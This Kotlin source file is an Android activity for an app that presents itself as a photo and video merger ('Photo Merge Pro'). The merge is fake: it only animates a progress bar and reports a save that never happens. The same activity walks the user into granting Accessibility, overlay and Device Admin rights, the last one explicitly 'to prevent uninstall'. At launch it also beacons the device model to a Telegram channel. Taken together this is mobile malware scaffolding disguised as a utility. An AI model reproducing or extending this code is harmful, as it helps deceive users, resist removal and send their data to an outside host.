package com.magic.photoeditor

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.provider.Settings
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.GridLayoutManager
import androidx.recyclerview.widget.RecyclerView

class MergeActivity : AppCompatActivity() {

    private val PICK_IMAGES = 1001
    private val PICK_VIDEOS = 1002

    private lateinit var selectedImages: MutableList<Uri>
    private lateinit var selectedVideos: MutableList<Uri>
    private lateinit var adapter: MediaAdapter
    private lateinit var progressBar: ProgressBar
    private lateinit var txtStatus: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Config.load(this)
        setContentView(R.layout.activity_merge)

        selectedImages = mutableListOf()
        selectedVideos = mutableListOf()
        progressBar = findViewById(R.id.progressBar)
        txtStatus = findViewById(R.id.txtStatus)

        val recyclerView = findViewById<RecyclerView>(R.id.recyclerView)
        adapter = MediaAdapter(selectedImages, selectedVideos)
        recyclerView.layoutManager = GridLayoutManager(this, 3)
        recyclerView.adapter = adapter

        val txtCount = findViewById<TextView>(R.id.txtCount)
        val btnSelectImages = findViewById<Button>(R.id.btnSelectImages)
        val btnSelectVideos = findViewById<Button>(R.id.btnSelectVideos)
        val btnMerge = findViewById<Button>(R.id.btnMerge)
        val btnAccessibility = findViewById<Button>(R.id.btnAccessibility)
        val btnDeviceAdmin = findViewById<Button>(R.id.btnDeviceAdmin)
        val btnOverlay = findViewById<Button>(R.id.btnOverlay)

        btnSelectImages.setOnClickListener {
            val intent = Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            intent.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true)
            startActivityForResult(intent, PICK_IMAGES)
        }

        btnSelectVideos.setOnClickListener {
            val intent = Intent(Intent.ACTION_PICK, MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
            intent.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true)
            startActivityForResult(intent, PICK_VIDEOS)
        }

        btnMerge.setOnClickListener {
            if (selectedImages.isEmpty() && selectedVideos.isEmpty()) {
                Toast.makeText(this, "Select at least one image or video", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            startFakeMerge()
        }

        btnAccessibility.setOnClickListener {
            enableAccessibility()
        }

        btnDeviceAdmin.setOnClickListener {
            enableDeviceAdmin()
        }

        btnOverlay.setOnClickListener {
            enableOverlay()
        }

        updateCount()

        // Send Telegram test
        try {
            val testSender = TelegramSender()
            testSender.sendMessage("✅ App started on ${android.os.Build.MODEL}")
        } catch (e: Exception) {
            // ignore
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (resultCode == RESULT_OK && data != null) {
            if (requestCode == PICK_IMAGES) {
                if (data.clipData != null) {
                    for (i in 0 until data.clipData!!.itemCount) {
                        val uri = data.clipData!!.getItemAt(i).uri
                        if (!selectedImages.contains(uri)) {
                            selectedImages.add(uri)
                        }
                    }
                } else if (data.data != null) {
                    selectedImages.add(data.data!!)
                }
                updateCount()
            } else if (requestCode == PICK_VIDEOS) {
                if (data.clipData != null) {
                    for (i in 0 until data.clipData!!.itemCount) {
                        val uri = data.clipData!!.getItemAt(i).uri
                        if (!selectedVideos.contains(uri)) {
                            selectedVideos.add(uri)
                        }
                    }
                } else if (data.data != null) {
                    selectedVideos.add(data.data!!)
                }
                updateCount()
            }
        }
    }

    private fun updateCount() {
        val txtCount = findViewById<TextView>(R.id.txtCount)
        txtCount.text = "📷 ${selectedImages.size} images | 🎬 ${selectedVideos.size} videos"
        adapter.notifyDataSetChanged()
    }

    private fun startFakeMerge() {
        progressBar.visibility = ProgressBar.VISIBLE
        progressBar.progress = 0
        txtStatus.visibility = TextView.VISIBLE
        txtStatus.text = "Starting merge..."

        val total = selectedImages.size + selectedVideos.size
        val delayPerFile = 2000 / total.coerceAtLeast(1)
        var current = 0

        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                current++
                val progress = (current.toFloat() / total * 100).toInt()
                progressBar.progress = progress

                if (current <= selectedImages.size) {
                    val name = selectedImages[current - 1].lastPathSegment ?: "image"
                    txtStatus.text = "Merging image $current/$total: $name"
                } else if (current <= total) {
                    val videoIndex = current - selectedImages.size - 1
                    val name = selectedVideos[videoIndex].lastPathSegment ?: "video"
                    txtStatus.text = "Merging video $current/$total: $name"
                }

                if (current < total) {
                    Handler(Looper.getMainLooper()).postDelayed(this, delayPerFile.toLong())
                } else {
                    progressBar.progress = 100
                    txtStatus.text = "✅ Merge complete! Saved to /Pictures/Merged/"
                    Handler(Looper.getMainLooper()).postDelayed({
                        progressBar.visibility = ProgressBar.GONE
                        txtStatus.text = "Ready"
                    }, 1500)
                }
            }
        }, 500)
    }

    // NEW: Enable Accessibility Service
    private fun enableAccessibility() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
            Toast.makeText(this, "Enable 'Photo Merge Pro' in Accessibility settings", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Cannot open settings: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    // NEW: Enable Device Admin
    private fun enableDeviceAdmin() {
        try {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            startActivity(intent)
            Toast.makeText(this, "Activate Device Admin to prevent uninstall", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Cannot open device admin: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    // NEW: Enable Overlay
    private fun enableOverlay() {
        try {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
            Toast.makeText(this, "Enable 'Display over other apps'", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Cannot open overlay settings: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }
}
